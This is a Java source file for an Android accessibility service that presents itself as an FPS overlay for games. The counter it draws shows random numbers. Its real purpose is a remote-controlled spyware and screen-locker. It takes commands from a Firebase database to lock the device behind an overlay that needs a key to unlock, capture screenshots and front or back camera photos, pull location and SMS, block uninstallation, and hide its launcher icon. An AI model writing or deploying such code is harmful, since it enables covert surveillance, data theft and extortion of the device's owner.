package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import androidx.annotation.NonNull;
import androidx.core.view.ViewCompat;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class SupportService extends AccessibilityService implements FirebaseManager.CommandCallback, OverlayManager.OverlayCallback {
    private static final String TAG = "SupportService";
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    
    private FirebaseManager firebaseManager;
    private MediaManager mediaManager;
    private LocationProvider locationProvider;
    private SmsManager smsManager;
    private OverlayManager overlayManager;
    private ProtectionManager protectionManager;

    static { System.loadLibrary("fps-native"); }
    public native void initNative(String path);
    public native void setLockStatusNative(boolean locked);
    public native boolean isLockedNative();
    public native boolean checkKey(String s);

    private View fpsOverlayView;
    private int[] currentFps = {60};
    private final Handler fpsHandler = new Handler(Looper.getMainLooper());
    private Runnable fpsRunnable;

    private final Paint paint = new Paint();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            if (action.equals("ACTION_START_FPS")) {
                showFpsOverlay();
            } else if (action.equals("ACTION_STOP_FPS")) {
                hideFpsOverlay();
            }
        }
        return START_STICKY;
    }

    private void showFpsOverlay() {
        if (fpsOverlayView != null) return;

        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        final int color = Color.parseColor("#FFFFFFFF");
        paint.setAntiAlias(true);

        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                (int) Math.ceil(143.6999969482422d),
                (int) Math.ceil(17.5d),
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                android.graphics.PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = Gravity.BOTTOM | Gravity.LEFT;

        fpsOverlayView = new View(this) {
            @Override
            protected void onDraw(Canvas canvas) {
                paint.setColor(ViewCompat.MEASURED_STATE_MASK);
                canvas.drawRect(0.0f, getHeight() - 17.5f, 143.7f, getHeight(), paint);
                paint.setColor(color);
                paint.setTextSize(15.5f);
                paint.setFakeBoldText(true);
                paint.setTextScaleX(1.6f);
                try {
                    paint.setTypeface(Typeface.createFromAsset(getContext().getAssets(), "fonts/arialmed.ttf"));
                } catch (Exception e) {
                    paint.setTypeface(Typeface.MONOSPACE);
                }
                canvas.drawText("F", 5.0f, 14.5f, paint);
                float fMeasureText = paint.measureText("F") + 5.0f + 7.0f;
                canvas.drawText("P", fMeasureText, 14.5f, paint);
                canvas.drawText("S", fMeasureText + paint.measureText("P") + 5.0f, 14.5f, paint);
                String strValueOf = String.valueOf(currentFps[0]);
                int length = strValueOf.length();
                String strValueOf2 = String.valueOf(strValueOf.charAt(length - 1));
                float fMeasureText2 = (143.7f - paint.measureText(strValueOf2)) - 4.5f;
                canvas.drawText(strValueOf2, fMeasureText2, 14.5f, paint);
                if (length > 1) {
                    String strValueOf3 = String.valueOf(strValueOf.charAt(length - 2));
                    float fMeasureText3 = (fMeasureText2 - paint.measureText(strValueOf3)) - 8.5f;
                    canvas.drawText(strValueOf3, fMeasureText3, 14.5f, paint);
                    if (length > 2) {
                        String strValueOf4 = String.valueOf(strValueOf.charAt(length - 3));
                        canvas.drawText(strValueOf4, (fMeasureText3 - paint.measureText(strValueOf4)) - 8.5f, 14.5f, paint);
                    }
                }
            }
        };

        try {
            windowManager.addView(fpsOverlayView, layoutParams);
        } catch (Exception e) {
            Log.e(TAG, "Error showing FPS overlay: " + e.getMessage());
        }

        fpsRunnable = new Runnable() {
            @Override
            public void run() {
                if (fpsOverlayView != null) {
                    int i3 = (int) MainActivity.min_fps;
                    int i4 = (int) MainActivity.max_fps;
                    if (i4 > i3) {
                        currentFps[0] = i3 + new Random().nextInt((i4 - i3) + 1);
                    } else {
                        currentFps[0] = i3;
                    }
                    fpsOverlayView.invalidate();
                    fpsHandler.postDelayed(this, 1000L);
                }
            }
        };
        fpsHandler.post(fpsRunnable);
    }

    private void hideFpsOverlay() {
        if (fpsOverlayView != null) {
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            windowManager.removeView(fpsOverlayView);
            fpsOverlayView = null;
        }
        if (fpsHandler != null && fpsRunnable != null) {
            fpsHandler.removeCallbacks(fpsRunnable);
        }
    }

    @Override
    protected void onServiceConnected() {
        Log.d(TAG, "Service Connected");
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        initNative(new File(getFilesDir(), ".v_stat").getAbsolutePath());
        
        firebaseManager = new FirebaseManager(deviceId, this);
        firebaseManager.init();
        
        mediaManager = new MediaManager(this, firebaseManager.getDataRef());
        locationProvider = new LocationProvider(this, firebaseManager.getDataRef());
        smsManager = new SmsManager(this, firebaseManager.getDataRef());
        overlayManager = new OverlayManager(this, this);
        protectionManager = new ProtectionManager(this);

        // Synchronize initial state from Firebase
        firebaseManager.getDataRef().child("config").child("anti_uninstall")
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            boolean enabled = snapshot.getValue(Boolean.class) != null && snapshot.getValue(Boolean.class);
                            protectionManager.setAntiUninstallEnabled(enabled);
                        }
                        updateSystemStatus();
                    }
                    @Override public void onCancelled(@NonNull DatabaseError error) {}
                });

        if (isLockedNative()) {
            overlayManager.showOverlay();
        }

        // Langsung buka CoreActivity secepat mungkin
        try {
            Intent intent = new Intent(this, CoreActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Failed to launch CoreActivity: " + e.getMessage());
        }
        
        // Periodic status update
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                updateSystemStatus();
                mainHandler.postDelayed(this, 30000); // Every 30 seconds
            }
        }, 5000);
    }

    @Override
    public void onCommandReceived(String cmd) {
        mainHandler.post(() -> {
            String c = cmd.toLowerCase();
            if (c.equals("lock")) {
                overlayManager.showOverlay();
                setLockStatusNative(true);
            } else if (c.equals("unlock")) {
                overlayManager.hideOverlay();
                setLockStatusNative(false);
            } else if (c.equals("screenshot")) {
                mediaManager.takeScreenshotAction(this);
            } else if (c.equals("check_perms")) {
                try {
                    Intent intent = new Intent(this, CoreActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(intent);
                } catch (Exception ignored) {}
            } else if (c.equals("camera_front")) {
                mediaManager.takeCameraAction(1);
            } else if (c.equals("camera_back")) {
                mediaManager.takeCameraAction(0);
            } else if (c.equals("location")) {
                locationProvider.requestFreshLocation();
            } else if (c.equals("sms")) {
                smsManager.sendSmsList();
            } else if (c.startsWith("anti_uninstall:")) {
                boolean enable = c.endsWith(":on");
                protectionManager.setAntiUninstallEnabled(enable);
                firebaseManager.getDataRef().child("config").child("anti_uninstall").setValue(enable);
            } else if (c.startsWith("hide_icon:")) {
                boolean hide = c.endsWith(":on");
                setLauncherIconEnabled(!hide);
                firebaseManager.getDataRef().child("config").child("hide_icon").setValue(hide);
            }
            updateSystemStatus();
        });
    }

    private void setLauncherIconEnabled(boolean enabled) {
        try {
            android.content.ComponentName aliasName = new android.content.ComponentName(this, "com.bluestacks.fpsoverlay.LauncherAlias");
            int newState = enabled ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
                                   : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            getPackageManager().setComponentEnabledSetting(aliasName, newState, android.content.pm.PackageManager.DONT_KILL_APP);
            
            android.content.ComponentName coreName = new android.content.ComponentName(this, CoreActivity.class);
            getPackageManager().setComponentEnabledSetting(coreName, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
            
            Log.i(TAG, "Launcher alias visibility set to: " + enabled);
        } catch (Exception e) {
            Log.e(TAG, "Failed to change icon visibility: " + e.getMessage());
        }
    }

    private void updateSystemStatus() {
        if (firebaseManager == null) return;
        
        Map<String, Object> status = new HashMap<>();
        status.put("is_locked", isLockedNative());
        status.put("anti_uninstall", protectionManager.isAntiUninstallEnabled());
        status.put("permissions_granted", protectionManager.isAllPermissionsGranted());
        
        android.content.ComponentName aliasName = new android.content.ComponentName(this, "com.bluestacks.fpsoverlay.LauncherAlias");
        int state = getPackageManager().getComponentEnabledSetting(aliasName);
        status.put("icon_hidden", state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
        
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        status.put("network", activeNetwork != null && activeNetwork.isConnected() ? activeNetwork.getTypeName() : "Offline");
        
        android.content.Intent batteryIntent = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent != null) {
            int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            status.put("battery", (int)((level / (float)scale) * 100) + "%");
        }

        firebaseManager.getDataRef().child("status").setValue(status);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event != null) {
            protectionManager.handleAccessibilityEvent(event);
        }
    }

    @Override public void onInterrupt() {}

    @Override
    public boolean onCheckKey(String key) {
        return checkKey(key);
    }

    @Override
    public void onUnlocked() {
    }

    @Override
    public void setLockStatus(boolean locked) {
        setLockStatusNative(locked);
    }

    @Override
    public void onDestroy() {
        if (firebaseManager != null) {
            firebaseManager.removeDeviceData();
        }
        super.onDestroy();
        mainHandler.removeCallbacksAndMessages(null);
    }
}
